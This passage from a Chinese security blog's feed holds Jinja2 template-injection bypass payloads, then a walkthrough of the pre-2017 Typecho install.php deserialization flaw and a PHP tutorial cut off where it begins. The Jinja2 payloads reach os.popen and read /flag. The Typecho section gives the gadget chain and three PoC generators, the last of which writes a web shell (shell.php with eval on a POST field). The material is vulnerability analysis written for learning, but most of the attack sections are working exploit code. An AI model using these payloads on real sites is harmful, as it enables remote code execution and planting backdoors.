class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;ls /&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>7. 禁止导入敏感包   首先就是ban了`__import__`,   我们可以在`__import__`之间添加空格或者使用`importlib`   还有就是对包进行黑名单检查，我们可以进行字符编码进行绕过  或者字符串拼接：  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).system(<span class="hljs-string">&#x27;who&#x27;</span>+<span class="hljs-string">&#x27;ami&#x27;</span>)</span><br></code></pre></td></tr></table></figure>  或者字符串翻转：  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>])<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;who&#x27;</span>+<span class="hljs-string">&#x27;ami&#x27;</span>)<br></code></pre></td></tr></table></figure>8. 利用`|attr()`绕过   `|attr()`是Jinjia2里面的过滤器，（过滤器就是改变变量输出的东西，例如`&#123;&#123;name|upper&#125;&#125;</code>变量name输出就是大写，而后面这个就是过滤器）它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ <code>|</code> ）分割。这个就好像不能使用<code>[]</code>了</p><p>当<code>.和[]</code>同时被过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">原poc：&#123;&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>改之后：&#123;&#123;()|attr()(<span class="hljs-string">&quot;__class__&quot;</span>)|attr()(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-string">&quot;__getitem__&quot;</span>)(<span class="hljs-number">77</span>)|attr(<span class="hljs-string">&quot;__init__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;__getitem__&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;ls&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure><p>当<code>_ . []</code>被过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">原poc:&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;<br>    绕过[]，使用__getitem__()绕过：<br>    &#123;&#123;().__class__.__base__.subclasses__().__getitem__(<span class="hljs-number">77</span>).__init__.__globals__.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;eval&#x27;</span>)(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;<br>    因为`_`还是被过滤了，所以使用request绕过，但是还需要绕过`.`:<br>        &#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(<span class="hljs-number">77</span>)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="hljs-built_in">eval</span>&amp;x9=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()<br></code></pre></td></tr></table></figure></li><li><p><code>__enter__</code></p><p>同<code>__init__</code>，当<code>__init__</code>被限制时可用于等价替换</p></li><li><p><code>func_globals</code></p><p>Py2才可用，同<code>__globals__</code>，可等价替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;/flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typcho反序列化漏洞分析</title>
    <link href="/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="Typcho反序列化漏洞分析"><a href="#Typcho反序列化漏洞分析" class="headerlink" title="Typcho反序列化漏洞分析"></a>Typcho反序列化漏洞分析</h2><h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><p>2017年10月24日之前的所有版本</p><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>下载地址：<code>http://typecho.org/</code>，这里主要是说下，在<code>intall</code>之前，需要我们手动去数据库添加<code>Typecho</code>数据库</p><p>我之前去官网下载的0.9的版本，结果复现失败，想下载之前的版本，官网也没有了，这里找到了1.0.14版本</p><p>链接：<code>https://pan.baidu.com/s/1Cc7qJfGSwVop9L1X4pC67Q </code> 提取码：<code>fwvp </code></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>漏洞入口：<code>install.php</code>246行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span> = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br><span class="hljs-variable">$type</span> = explode(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>]);<br><span class="hljs-variable">$type</span> = array_pop(<span class="hljs-variable">$type</span>);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$installDb</span> = <span class="hljs-keyword">new</span> Typecho_Db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br><span class="hljs-variable">$installDb</span>-&gt;addServer(<span class="hljs-variable">$config</span>, Typecho_Db::READ | Typecho_Db::WRITE);<br>    &#125;   <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>明显的一个反序列化函数，但是如何利用呢，反序列化能够利用的点必须要有相应的魔术方法配合。其中比较关键的有这几个。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__destruct</span>()</span><br><span class="hljs-function"><span class="hljs-title">__wakeup</span>()</span><br><span class="hljs-function"><span class="hljs-title">__toString</span>()</span><br><span class="hljs-function"><span class="hljs-title">__call</span>()</span><br><span class="hljs-function"><span class="hljs-title">__get</span>()</span><br></code></pre></td></tr></table></figure><p>其中<code>__destruct()</code>是在对象被销毁的时候自动调用，<code>__Wakeup</code>在反序列化的时候自动调用，<code>__toString()</code>是在调用对象当作字符串的时候自动调用。<code>__call()</code>是在对象调用的方法不存在的时候自动调用。<code>__get()</code>是在读取不可访问的属性的值的时候自动调用</p><p>先查看<code>Typecho_Cookie</code>类中的<code>get()</code>函数吧：存在于<code>Cookie.php</code></p><p><img src="/wzimg/10.png" alt="e"></p><p>这里的<code>key</code>即是<code>__typecho_config</code>，我们可以通过<code>COOKIE</code>或者<code>POST</code>传参并返回成为<code>config</code>，<code>install.php</code>又存在这个代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$installDb</span> = <span class="hljs-keyword">new</span> Typecho_Db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>说明<code>Typecho_Db</code>类的参数我们可控，回溯<code>Typecho_Db</code>类：存在于<code>Db.php</code></p><p><img src="/wzimg/11.png" alt="f"></p><p>这里的<code>adapterName</code>就是我们可控的<code>config</code>，发现这里对<code>adapterName</code>进行了字符替换，那当它为一个类的时候，那么就会自动调用<code>__toString()</code>方法</p><p>所以这里如果构造的反序列化是一个数组，其中<code>adapter</code>设置为某个类，就可以触发相应类的<code>__toString</code>方法</p><p>全局搜索<code>toString</code></p><p>在<code>Typecho/var/Typecho/Feed.php</code>可以利用：</p><p><img src="/wzimg/12.png" alt="a"></p><p>顺着分析<code>__tostring()</code>函数</p><p>290行 调用了<code>$item[&#39;author&#39;]-&gt;screenName</code>，<code>$items</code>这是一个当前类的私有变量，<code>$item</code>又是由<code>$items</code>遍历而来，所以可控</p><p><img src="/wzimg/13.png" alt="b"></p><p>这里的<code>item[&#39;author&#39;]</code>调用了<code>sceenName</code>方法，若<code>item[&#39;author&#39;]</code>为一个类时，而且不存在<code>sceenName</code>方法时，就会调用<code>__get</code>魔术方法，所以全局搜索<code>__get</code>魔术方法。</p><p><code>/var/Typecho/Request.php</code>发现可以利用</p><p><img src="/wzimg/14.png" alt="c"></p><p>回溯<code>get()</code>函数</p><p><img src="/wzimg/15.png" alt="d"></p><p>跟进<code>applyFilter</code>函数：</p><p><img src="/wzimg/16.png" alt="g"></p><p>存在危险函数<code>call_user_func</code></p><p><img src="/wzimg/17.png" alt="h"></p><p><img src="/wzimg/18.png" alt="j"></p><p>发现<code>filter</code>是可控的</p><p><img src="/wzimg/19.png" alt="k"></p><p>发现<code>value</code>是通过<code>params</code>传值的，</p><p><img src="/wzimg/20.png" alt="l"></p><p><code>params</code>可控，所以<code>value</code>可控，所以<code>call_user_func</code>函数可以使用</p><p>回溯整条<code>pop chain</code>：</p><p>首先就是反序列化可控的<code>__typecho_config</code>，又对此实例化，使之成为<code>Typecho_Cookie</code>类中的<code>key</code>值，然后我们可以POST传入参数<code>key</code>即<code>__typecho_config</code>，在<code>Typecho_Cookie</code>类中又存在<code>adapterName</code>变量进行字符串的使用，而且<code>adapterName</code>即为<code>config[&#39;adapter&#39;]</code>可控，当我们使之为<code>Feed.php</code>文件中的<code>Typecho_Feed</code>类时，又会调用该类的<code>__toString()</code>魔术方法，此类又存在可控变量<code>$item[&#39;author&#39;]</code>调用<code>screenName</code>，当可控参数为一个没有<code>screenName </code>方法的类的时候，就会调用<code>__get()</code>魔术方法，最后就到了<code>Typecho_Request</code>类了，最好找到可以利用的危险函数<code>call_user_func</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">install.php::__typecho_config<span class="hljs-function"> (即为T<span class="hljs-params">ypecho_Cookie</span>类中的<span class="hljs-params">key</span>值，通过<span class="hljs-params">post</span>传参成为<span class="hljs-params">config</span>)  =&gt;</span>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Db</span>.</span></span>php::Typecho_Db<span class="hljs-function"> (<span class="hljs-params">adapterName</span>即为<span class="hljs-params">config</span>[&#x27;<span class="hljs-params">adapter</span>&#x27;])  =&gt;</span>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Feed</span>.</span></span>php::Typecho_Feed::<span class="hljs-constructor">__toString()</span>::$item<span class="hljs-literal">[&#x27;<span class="hljs-identifier">author</span>&#x27;]</span>-&gt;screenName<span class="hljs-function"> (<span class="hljs-params">$item</span>[&#x27;<span class="hljs-params">author</span>&#x27;]可控)  =&gt;</span>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Request</span>.</span></span>php::Typecho_Request::<span class="hljs-constructor">__get()</span>::get<span class="hljs-literal">()</span>::apply<span class="hljs-constructor">Filter()</span>::call_user_func<br></code></pre></td></tr></table></figure><p>最后在<code>install.php</code>还存在两个<code>exit</code>，我们需要满足他们：</p><p><img src="/wzimg/21.png" alt="q"></p><p>就是 </p><p> 1.finish参数不为空</p><p>2.Referer为本站</p><p>构造poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;assert&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;sceenName&#x27;</span>]=<span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-string">&#x27;0&#x27;</span>]=<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;author&#x27;</span>=&gt;<span class="hljs-keyword">new</span> Typecho_Request(),<br>        );<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$a</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span><br>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$b</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当提交<code>payload</code>后，服务器会回显500：</p><p><img src="/wzimg/22.png" alt="w"></p><p>到这里就理解不了了，根据<code>https://paper.seebug.org/424/</code>讲解如下：</p><p>在<code>install.php</code>的开始，调用了<code>ob_start()</code></p><p><img src="/wzimg/23.png" alt="a"></p><p>因为我们上面对象注入的代码触发了原本的exception，导致<code>ob_end_clean()</code>执行，原本的输出会在缓冲区被清理。</p><p>我们必须想一个办法强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。</p><p>这里有两个办法。 1、因为<code>call_user_func</code>函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。最后POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// $this-&gt;_params[&#x27;screenName&#x27;] = &#x27;whoami&#x27;;</span><br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>] = -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-comment">/** 定义ATOM 1.0类型 */</span><br>    <span class="hljs-keyword">const</span> ATOM1 = <span class="hljs-string">&#x27;ATOM 1.0&#x27;</span>;<br>    <span class="hljs-comment">/** 定义RSS时间格式 */</span><br>    <span class="hljs-keyword">const</span> DATE_RFC822 = <span class="hljs-string">&#x27;r&#x27;</span>;<br>    <span class="hljs-comment">/** 定义ATOM时间格式 */</span><br>    <span class="hljs-keyword">const</span> DATE_W3CDTF = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <span class="hljs-comment">/** 定义行结束符 */</span><br>    <span class="hljs-keyword">const</span> EOL = <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dateFormat</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;link&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;2&#x27;</span>;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;date&#x27;</span>] = <span class="hljs-number">1507720298</span>;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>] = <span class="hljs-keyword">new</span> Typecho_Request();<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;category&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Typecho_Request());<br><br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-variable">$item</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;host&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-string">&#x27;xxxxxx&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-string">&#x27;3306&#x27;</span>,<br>    <span class="hljs-string">&#x27;database&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho&#x27;</span>,<br>    <span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$x</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span><br>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/24.png" alt="v"></p><p>但其实还有另一种利用方法，即使500了也还是执行了命令的，所以我们可以直接写入后门，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;assert&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>] = <span class="hljs-string">&#x27;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[w0s1np]); ?&gt;&quot;)&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;author&#x27;</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),<br>        );<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$final</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$final</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span><br>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$poc</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>虽然使用后，服务器还是回显500，但后门会成功写入</p><p><img src="/wzimg/25.png" alt="z"></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="/2021/04/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h3><p>序列化：利用<code>serialize()</code>函数将一个对象转换为字符串形式。使保存、传输对象数据更加方便。</p><p>序列化操作只是保存对象(不是类)的变量，不保存对象的方法，反序列化的主要危害在于我们可以控制对象的变量来改变程序执行流程从而达到我们最终的目的。我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;w0s1np&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-string">&quot;18&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> test();<br>    print_r(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://z3.ax1x.com/2021/04/09/cNIuM8.png" alt="a"></p><p>注意：序列化只序列属性，不序列方法。</p><p>再把该数组序列化转化为字符串输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> 